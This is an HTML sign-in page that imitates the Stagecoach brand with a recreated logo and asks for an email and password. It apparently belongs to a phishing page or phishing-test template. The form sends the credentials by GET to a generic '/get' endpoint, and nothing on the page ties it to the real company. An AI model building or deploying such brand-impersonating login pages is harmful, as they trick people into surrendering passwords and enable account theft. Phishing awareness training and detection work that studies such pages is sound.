<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {
            font-family: Arial, Helvetica, sans-serif;
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background: #f5f5f5;
        }
        .container {
            max-width: 420px;
            padding: 25px;
            margin: auto;
        }
        .form {
            max-width: 300px;
            padding: 20px;
            border: 1px solid #cccccc;
            border-radius: 5px;
            margin: 0 auto;
            background: white;
        }
        h1 {
            text-align: center;
            color: #E65C00;
            font-size: 22px;
            margin: 18px 0 20px;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 12px 10px;
            margin: 8px 0;
            box-sizing: border-box;
            border: 1px solid #cccccc;
            border-radius: 4px;
        }
        button[type="submit"] {
            width: 100%;
            background-color: #E65C00;
            color: white;
            padding: 14px 20px;
            margin: 8px 0;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }
        button[type="submit"]:hover {
            background-color: #C44F00;
        }
        .logo {
            text-align: center;
            margin-bottom: 12px;
        }
        .logo svg {
            width: 260px;
            height: auto;
            display: inline-block;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <!-- Stagecoach Logo -->
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 60" width="320" height="60">
                <g id="Emblem">
                    <!-- Outer Dark Blue Disc Background -->
                    <circle cx="30" cy="30" r="28" fill="#002244" />
                    <!-- Inner Swirl Loops (Amber, Teal, Blue) -->
                    <path d="M 30,8 A 22,22 0 1,1 12,42 A 16,16 0 1,0 30,14 Z" fill="#F2A900" />
                    <path d="M 28,12 A 18,18 0 1,1 14,38 A 12,12 0 1,0 28,18 Z" fill="#00A3A6" />
                    <path d="M 26,16 A 14,14 0 1,1 16,34 A 8,8 0 1,0 26,22 Z" fill="#0072CE" />
                </g>
                <g id="Wordmark">
                    <text x="70" y="40" font-family="'Helvetica Neue', Arial, sans-serif" font-weight="800" font-size="33" fill="#002244" letter-spacing="-1">Stagecoach</text>
                </g>
            </svg>
        </div>

        <form action="/get" method="get" id="email-form-step" class="form">
            <h1>Sign In with<br>your Stagecoach account</h1>
            <input name="email" type="text" placeholder="Email" required>
            <input name="password" type="password" placeholder="Password" required>
            <button type="submit">Next</button>
        </form>
    </div>
</body>
</html>
